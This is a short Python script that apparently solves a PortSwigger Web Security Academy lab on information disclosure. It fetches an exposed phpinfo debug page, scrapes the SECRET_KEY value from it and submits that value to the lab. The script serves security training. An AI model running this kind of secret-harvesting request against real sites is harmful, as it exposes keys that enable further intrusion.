#!/usr/bin/env python3
# Lab: Information disclosure on debug page
# Lab-Link: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-on-debug-page
# Difficulty: APPRENTICE
from bs4 import BeautifulSoup
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    r = requests.get(f'{host}/cgi-bin/phpinfo.php', verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    key = soup.find('td', attrs={'class': 'e'}, string='SECRET_KEY ').next_sibling.text.strip()
    print(f'[+] Secret key found: {key}')

    data = {'answer': key}
    r = requests.post(f'{host}/submitSolution', data=data, verify=False, proxies=proxies)
    if '{"correct":true}' in r.text:
        print(f'[+] Correct version sumbitted, lab solved')
    else:
        print(f'[-] Failed to solve lab')


if __name__ == "__main__":
    main()
